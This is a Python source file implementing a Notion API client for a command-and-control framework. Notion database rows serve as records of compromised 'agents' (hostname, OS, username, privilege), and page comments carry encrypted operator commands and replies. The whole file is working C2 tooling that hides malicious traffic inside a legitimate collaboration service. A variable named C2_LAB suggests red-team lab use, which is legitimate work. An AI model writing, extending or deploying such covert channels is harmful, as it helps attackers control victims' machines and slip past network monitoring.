"""
Notion API client — mirrors github_api.py interface.
Uses Notion Database rows (Pages) as agents and Page Comments for C2 communication.
"""
import time
from datetime import datetime, timezone

import os

import requests

from github_api import _parse_retry_after


class NotionClient:
    BASE = os.environ.get("C2_LAB", "https://api.notion.com/v1")
    if "api.notion.com" not in BASE:
        BASE = BASE.rstrip("/") + "/v1"
    VERSION = "2022-06-28"

    def __init__(self, token: str, database_id: str):
        self.token = token
        self.database_id = database_id
        self._last_error = ""
        self._s = requests.Session()
        self._s.headers.update({
            "Authorization":  f"Bearer {token}",
            "Notion-Version": self.VERSION,
            "Content-Type":   "application/json",
        })

    # ── Low-level helpers ──────────────────────────────────────────────────────

    def _request(self, method: str, url: str, **kw):
        """Retry up to 3 times with backoff; honour Retry-After on 429."""
        self._last_error = ""
        delay = 2
        for attempt in range(4):
            try:
                kw.setdefault("timeout", 15)
                r = self._s.request(method, url, **kw)
                if r.status_code == 429:
                    wait = _parse_retry_after(r.headers.get("Retry-After", "60"))
                    self._last_error = f"HTTP 429 rate-limited (Retry-After {wait}s)"
                    if attempt < 3:
                        time.sleep(min(wait, 60))
                        continue
                    return None
                if r.status_code >= 500 and attempt < 3:
                    self._last_error = f"HTTP {r.status_code} server error"
                    time.sleep(delay)
                    delay *= 2
                    continue
                return r
            except Exception as exc:
                self._last_error = f"{type(exc).__name__}: {exc}"
                if attempt < 3:
                    time.sleep(delay)
                    delay *= 2
        return None

    def _get(self, path: str, **params):
        return self._request("GET", f"{self.BASE}/{path}", params=params or None)

    def _post(self, path: str, body: dict):
        return self._request("POST", f"{self.BASE}/{path}", json=body)

    def _patch(self, path: str, body: dict):
        return self._request("PATCH", f"{self.BASE}/{path}", json=body)

    def _delete(self, path: str):
        return self._request("DELETE", f"{self.BASE}/{path}")

    # ── Helpers ────────────────────────────────────────────────────────────────

    @staticmethod
    def _prop_text(value: str) -> dict:
        return {"rich_text": [{"text": {"content": value}}]}

    @staticmethod
    def _prop_title(value: str) -> dict:
        return {"title": [{"text": {"content": value}}]}

    @staticmethod
    def _prop_select(value: str) -> dict:
        return {"select": {"name": value}}

    @staticmethod
    def _read_prop(page: dict, name: str) -> str:
        props = page.get("properties", {})
        prop = props.get(name, {})
        ptype = prop.get("type", "")
        if ptype == "title":
            items = prop.get("title", [])
            return items[0].get("plain_text", "") if items else ""
        if ptype == "rich_text":
            items = prop.get("rich_text", [])
            return items[0].get("plain_text", "") if items else ""
        if ptype == "select":
            sel = prop.get("select")
            return sel.get("name", "") if sel else ""
        if ptype == "date":
            d = prop.get("date")
            return d.get("start", "") if d else ""
        return ""

    # ── Agents (Database Rows = Pages) ─────────────────────────────────────────

    def get_agents(self) -> list[dict]:
        agents = []
        body: dict = {"page_size": 100}
        MAX_PAGES = 20
        page_num = 0
        while page_num < MAX_PAGES:
            page_num += 1
            r = self._post(f"databases/{self.database_id}/query", body)
            if not r or not r.ok:
                break
            data = r.json()
            for page in data.get("results", []):
                a = self._parse_agent(page)
                if a:
                    agents.append(a)
            if not data.get("has_more"):
                break
            next_cursor = data.get("next_cursor")
            if not next_cursor:
                break
            body["start_cursor"] = next_cursor
        return agents

    def _parse_agent(self, page: dict) -> dict | None:
        agent_id = self._read_prop(page, "Agent ID")
        if not agent_id:
            return None

        return {
            "id":         page["id"],           # page_id as the unique identifier
            "agent_uuid": agent_id,
            "repo":       self.database_id,     # database_id used as "repo" for grouping
            "channel":    "notion",
            "last_seen":  page.get("last_edited_time", ""),
            "hostname":   self._read_prop(page, "Hostname") or "unknown",
            "os":         self._read_prop(page, "OS") or "unknown",
            "username":   self._read_prop(page, "Username") or "unknown",
            "privilege":  self._read_prop(page, "Privilege") or "user",
            "kernel":     self._read_prop(page, "Kernel"),
            "arch":       self._read_prop(page, "Arch"),
            "version":    self._read_prop(page, "Version"),
            "release_id": "",
        }

    # ── Comments (Page Comments) ───────────────────────────────────────────────

    def get_comments(self, page_id: str, since: str | None = None) -> list[dict]:
        """Get comments on a page. Filter by created_time > since if provided."""
        comments = []
        params = {"block_id": page_id, "page_size": "100"}
        MAX_PAGES = 50
        page_num = 0
        while page_num < MAX_PAGES:
            page_num += 1
            r = self._get("comments", **params)
            if not r or not r.ok:
                break
            data = r.json()
            results = data.get("results", [])
            for c in results:
                nc = self._normalize_comment(c)
                # Early-return optimisation: Notion returns oldest-first;
                # if since is set and this comment is not newer, skip it.
                if since and nc.get("updated_at", "") <= since:
                    continue
                comments.append(nc)
            if not data.get("has_more"):
                break
            next_cursor = data.get("next_cursor")
            if not next_cursor:
                break
            params["start_cursor"] = next_cursor

        return comments

    @staticmethod
    def _normalize_comment(c: dict) -> dict:
        """Normalize a Notion comment to match GitHub comment format."""
        # Assemble body from rich_text array
        body = ""
        for rt in c.get("rich_text", []):
            body += rt.get("plain_text", "")

        return {
            "id":         c["id"],
            "body":       body,
            "created_at": c.get("created_time", ""),
            "updated_at": c.get("created_time", ""),  # Notion comments don't have updated_at
        }

    def post_comment(self, page_id: str, body: str) -> tuple[bool, str]:
        """Post a comment to a page. body is the raw text (e.g. '<!-- c -->encrypted')."""
        # Split body into rich_text chunks of 2000 chars each
        chunks = [body[i:i+2000] for i in range(0, len(body), 2000)]
        rich_text = [{"type": "text", "text": {"content": chunk}} for chunk in chunks]

        payload = {
            "parent": {"page_id": page_id},
            "rich_text": rich_text,
        }
        r = self._post("comments", payload)
        if r is None:
            return False, "network error or timeout (no response)"
        if r.ok:
            return True, ""
        try:
            msg = r.json().get("message", r.text[:200])
        except Exception:
            msg = r.text[:200]
        return False, f"HTTP {r.status_code}: {msg}"

    def delete_comment(self, comment_id: str) -> bool:
        """Notion does not support deleting individual comments via the API.
        Always returns False so callers know the operation did not succeed."""
        return False

    def clear_comments(self, page_id: str):
        """No-op — Notion does not support deleting individual comments."""
        pass

    # ── Page management ────────────────────────────────────────────────────────

    def delete_page(self, page_id: str) -> bool:
        """Move a page (agent row) to trash."""
        r = self._delete(f"blocks/{page_id}")
        return bool(r and (r.ok or r.status_code == 200))

    def list_agent_pages(self) -> list[dict]:
        """List all agent pages in the database (for cleanup/enumeration)."""
        pages = []
        body: dict = {"page_size": 100}
        while True:
            r = self._post(f"databases/{self.database_id}/query", body)
            if not r or not r.ok:
                break
            data = r.json()
            for page in data.get("results", []):
                agent_id = self._read_prop(page, "Agent ID")
                pages.append({
                    "page_id":    page["id"],
                    "uuid":       agent_id,
                    "updated_at": page.get("last_edited_time", ""),
                    "title":      self._read_prop(page, "Name"),
                })
            if not data.get("has_more"):
                break
            body["start_cursor"] = data["next_cursor"]
        return pages

    def auto_cleanup(self, limit: int, stale_days: int = 0) -> tuple[int, int, list[str]]:
        """Notion does not support deleting individual comments via the API,
        so comment-count cleanup is not possible. Returns (0, 0, [warning])
        to inform the caller rather than silently doing nothing."""
        return 0, 0, ["[Notion] Comment deletion is not supported by the Notion API — cleanup skipped"]
